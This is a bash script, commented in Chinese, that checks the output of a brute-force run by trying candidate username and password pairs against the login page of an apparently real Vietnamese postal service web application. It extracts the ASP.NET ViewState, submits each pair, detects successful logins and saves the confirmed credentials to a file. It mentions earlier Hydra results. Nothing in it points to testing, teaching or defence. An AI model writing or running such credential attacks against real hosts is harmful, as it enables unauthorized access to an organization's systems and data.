#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 验证VCKV爆破结果"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TEST_CREDS=(
    "nvdh:admin1234"
    "nvdh:Admin\$2023"
    "admin:admin1234"
    "vckvdbb:admin1234"
)

for cred in "${TEST_CREDS[@]}"; do
    user=$(echo $cred | cut -d':' -f1)
    pass=$(echo $cred | cut -d':' -f2)
    
    echo -n "[$user:$pass] 测试中... "
    
    # 获取ViewState等
    viewstate=$(curl -sk "http://vps.vnpost.vn/vckv/Login.aspx" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    
    # POST登录
    resp=$(curl -sk "http://vps.vnpost.vn/vckv/Login.aspx" \
        -X POST \
        -d "__VIEWSTATE=$viewstate" \
        -d "ctl00\$MainContent\$txtUser=$user" \
        -d "ctl00\$MainContent\$txtPassword=$pass" \
        -L 2>&1)
    
    # 检查登录成功
    if echo "$resp" | grep -qiE "logout|index.aspx|trang chu|dashboard|welcome"; then
        echo "✅ 成功！"
        echo "$user:$pass" >> vckv_confirmed_success.txt
    elif echo "$resp" | grep -qiE "login|dang nhap|sai|incorrect"; then
        echo "❌ 失败（登录表单仍存在）"
    else
        echo "⚠️  未知响应"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
if [ -f vckv_confirmed_success.txt ]; then
    echo "✅ 确认成功的凭证:"
    cat vckv_confirmed_success.txt
else
    echo "❌ 所有凭证验证失败（可能是Hydra误报）"
fi
